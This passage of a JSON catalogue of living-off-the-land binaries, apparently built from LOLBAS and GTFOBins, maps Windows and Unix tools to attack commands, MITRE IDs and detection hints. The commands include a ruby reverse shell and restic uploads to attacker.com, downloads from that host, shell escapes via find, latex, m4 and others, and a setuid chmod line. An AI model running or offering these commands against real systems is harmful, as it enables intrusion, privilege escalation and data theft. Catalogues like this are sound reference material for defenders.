                    "code": "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "vstest.console.exe",
            "description": "VSTest.Console.exe is the command-line tool to run tests",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general",
                    "code": "vstest.console.exe {PATH:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "winfile.exe",
            "description": "Windows File Manager executable",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute an executable file with WinFile as a parent process.",
                    "code": "winfile.exe {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "xsd.exe",
            "description": "XML Schema Definition Tool included with the Windows Software Development Kit (SDK).",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "xsd.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        }
    ],
    "linux": [
        {
            "name": "uuencode",
            "description": "Unix binary uuencode.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "uuencode /path/to/input-file /dev/stdout | uudecode"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor uuencode usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/uuencode/"
                }
            ]
        },
        {
            "name": "softlimit",
            "description": "Unix binary softlimit.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "softlimit /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor softlimit usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/softlimit/"
                }
            ]
        },
        {
            "name": "dd",
            "description": "Unix binary dd.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "dd if=/path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | dd of=/path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dd usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dd/"
                }
            ]
        },
        {
            "name": "lwp-download",
            "description": "Unix binary lwp-download.",
            "categories": [
                "execute",
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "lwp-download http://attacker.com/path/to/input-file /path/to/output-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "lwp-download file:///path/to/input-file /dev/stdout"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\nlwp-download file:///path/to/temp-file /path/to/output-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "lwp-download file:///path/to/input-file /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor lwp-download usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/lwp-download/"
                }
            ]
        },
        {
            "name": "volatility",
            "description": "Unix binary volatility.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "volatility -f /path/to/core-dump volshell\n..."
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor volatility usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/volatility/"
                }
            ]
        },
        {
            "name": "sash",
            "description": "Unix binary sash.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "sash"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sash usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sash/"
                }
            ]
        },
        {
            "name": "find",
            "description": "Unix binary find.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "find /path/to/input-file -exec cat {} \\;"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "find / -fprintf /path/to/output-file DATA -quit"
                },
                {
                    "label": "SHELL: ",
                    "code": "find . -exec /bin/sh \\; -quit"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor find usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/find/"
                }
            ]
        },
        {
            "name": "debugfs",
            "description": "Unix binary debugfs.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "debugfs\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor debugfs usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/debugfs/"
                }
            ]
        },
        {
            "name": "ranger",
            "description": "Unix binary ranger.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ranger\nS"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ranger usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ranger/"
                }
            ]
        },
        {
            "name": "logrotate",
            "description": "Unix binary logrotate.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "logrotate /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "logrotate -l /path/to/output-file DATA"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo -e '/path/to/temp-file.config {\\nmail x@x.x\\n}' >/path/to/temp-file.config\necho '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh\nlogrotate -m /path/to/temp-file.sh -f /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor logrotate usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/logrotate/"
                }
            ]
        },
        {
            "name": "m4",
            "description": "Unix binary m4.",
            "categories": [
                "execute",
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "echo 'esyscmd(/path/to/command)' | m4"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "m4 /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor m4 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/m4/"
                }
            ]
        },
        {
            "name": "redis",
            "description": "Unix binary redis.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "redis-cli -h 127.0.0.1\nconfig set dir /path/to/output-dir/\nconfig set dbfilename output-file\nset x \"DATA\"\nsave"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor redis usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/redis/"
                }
            ]
        },
        {
            "name": "paste",
            "description": "Unix binary paste.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "paste /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor paste usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/paste/"
                }
            ]
        },
        {
            "name": "ghc",
            "description": "Unix binary ghc.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ghc -e 'System.Process.callCommand \"/bin/sh\"'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ghc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ghc/"
                }
            ]
        },
        {
            "name": "jq",
            "description": "Unix binary jq.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "jq -Rr . /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor jq usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/jq/"
                }
            ]
        },
        {
            "name": "tail",
            "description": "Unix binary tail.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "tail -c+0 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tail usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tail/"
                }
            ]
        },
        {
            "name": "tshark",
            "description": "Unix binary tshark.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >/path/to/temp-file\ntshark -Xlua_script:/path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tshark usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tshark/"
                }
            ]
        },
        {
            "name": "sshpass",
            "description": "Unix binary sshpass.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "sshpass /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sshpass usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sshpass/"
                }
            ]
        },
        {
            "name": "latex",
            "description": "Unix binary latex.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\nstrings texput.dvi"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "latex --shell-escape '\\immediate\\write18{/bin/sh}'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor latex usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/latex/"
                }
            ]
        },
        {
            "name": "atobm",
            "description": "Unix binary atobm.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "atobm /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor atobm usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/atobm/"
                }
            ]
        },
        {
            "name": "enscript",
            "description": "Unix binary enscript.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor enscript usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/enscript/"
                }
            ]
        },
        {
            "name": "perf",
            "description": "Unix binary perf.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "perf stat /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor perf usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/perf/"
                }
            ]
        },
        {
            "name": "as",
            "description": "Unix binary as.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "as @/path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor as usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/as/"
                }
            ]
        },
        {
            "name": "restic",
            "description": "Unix binary restic.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup"
                },
                {
                    "label": "COMMAND: ",
                    "code": "restic --password-command='/path/to/command' backup"
                },
                {
                    "label": "SHELL: ",
                    "code": "RESTIC_PASSWORD_COMMAND='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' restic backup"
                },
                {
                    "label": "SHELL: ",
                    "code": "restic --password-command='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' backup"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "restic backup -r rest:http://attacker.com:12345/x /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor restic usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/restic/"
                }
            ]
        },
        {
            "name": "pkg",
            "description": "Unix binary pkg.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "pkg install -y --no-repo-update ./x-1.0.txz"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pkg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pkg/"
                }
            ]
        },
        {
            "name": "ssh-keygen",
            "description": "Unix binary ssh-keygen.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "ssh-keygen -D /path/to/lib.so"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ssh-keygen usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ssh-keygen/"
                }
            ]
        },
        {
            "name": "look",
            "description": "Unix binary look.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "look '' /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor look usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/look/"
                }
            ]
        },
        {
            "name": "fgrep",
            "description": "Unix binary fgrep.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "grep '' /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor fgrep usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/fgrep/"
                }
            ]
        },
        {
            "name": "tex",
            "description": "Unix binary tex.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "tex --shell-escape '\\immediate\\write18{/bin/sh}'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tex usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tex/"
                }
            ]
        },
        {
            "name": "clisp",
            "description": "Unix binary clisp.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "clisp -x '(ext:run-shell-command \"/bin/sh\")(ext:exit)'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor clisp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/clisp/"
                }
            ]
        },
        {
            "name": "latexmk",
            "description": "Unix binary latexmk.",
            "categories": [
                "file-read",
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}' >/path/to/temp-file\nlatexmk -dvi /path/to/temp-file\nstrings temp-file.dvi"
                },
                {
                    "label": "INHERIT: ",
                    "code": "latexmk -e '...'"
                },
                {
                    "label": "SHELL: ",
                    "code": "latexmk -pdf -pdflatex='/bin/sh #' /dev/null"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor latexmk usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/latexmk/"
                }
            ]
        },
        {
            "name": "unshare",
            "description": "Unix binary unshare.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "unshare /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor unshare usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/unshare/"
                }
            ]
        },
        {
            "name": "dos2unix",
            "description": "Unix binary dos2unix.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "dos2unix -f -O /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "dos2unix -f -n /path/to/input-file /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dos2unix usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dos2unix/"
                }
            ]
        },
        {
            "name": "chroot",
            "description": "Unix binary chroot.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "chroot /"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor chroot usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/chroot/"
                }
            ]
        },
        {
            "name": "ssh-keyscan",
            "description": "Unix binary ssh-keyscan.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ssh-keyscan -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ssh-keyscan usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ssh-keyscan/"
                }
            ]
        },
        {
            "name": "pwsh",
            "description": "Unix binary pwsh.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "pwsh -c '\"DATA\" | Out-File /path/to/output-file'"
                },
                {
                    "label": "SHELL: ",
                    "code": "pwsh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pwsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pwsh/"
                }
            ]
        },
        {
            "name": "pkexec",
            "description": "Unix binary pkexec.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "pkexec /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pkexec usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pkexec/"
                }
            ]
        },
        {
            "name": "gcc",
            "description": "Unix binary gcc.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "gcc -x c -E /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "gcc @/path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "gcc -x c /dev/null -o /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "gcc -wrapper /bin/sh,-s x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gcc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gcc/"
                }
            ]
        },
        {
            "name": "ruby",
            "description": "Unix binary ruby.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "ruby -e 'require \"open-uri\"; download = URI.open(\"http://attacker.com/path/to/input-file\"); IO.copy_stream(download, \"/path/to/output-file\")'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "ruby -e 'puts File.read(\"/path/to/input-file\")'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "ruby -e 'File.open(\"/path/to/output-file\", \"w+\") { |f| f.write(\"DATA\") }'"
                },
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"/path/to/lib.so\")'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",12345);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
                },
                {
                    "label": "SHELL: ",
                    "code": "ruby -e 'exec \"/bin/sh\"'"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "ruby -run -e httpd . -p 80"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ruby usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ruby/"
                }
            ]
        },
        {
            "name": "fish",
            "description": "Unix binary fish.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "fish"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor fish usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/fish/"
                }
            ]
        },
        {
            "name": "gtester",
            "description": "Unix binary gtester.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "gtester DATA -o /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'exec /bin/sh 0<&1' >/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gtester usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gtester/"
                }
            ]
        },
        {
            "name": "soelim",
            "description": "Unix binary soelim.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "soelim /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor soelim usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/soelim/"
                }
            ]
        },
        {
            "name": "gcloud",
            "description": "Unix binary gcloud.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "gcloud help"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gcloud usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gcloud/"
                }
            ]
        },
        {
            "name": "cargo",
            "description": "Unix binary cargo.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "cargo help doc"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cargo usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cargo/"
                }
            ]
        },
        {
            "name": "rsync",
            "description": "Unix binary rsync.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "rsync -e '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' x:x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rsync usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rsync/"
                }
            ]
        },
        {
            "name": "expand",
            "description": "Unix binary expand.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "expand /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor expand usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/expand/"
                }
            ]
        },
        {
            "name": "chmod",
            "description": "Unix binary chmod.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "chmod 6777 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor chmod usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/chmod/"
                }
            ]
        },
        {
            "name": "finger",
            "description": "Unix binary finger.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "finger x@attacker.com"
                },
                {
                    "label": "UPLOAD: ",
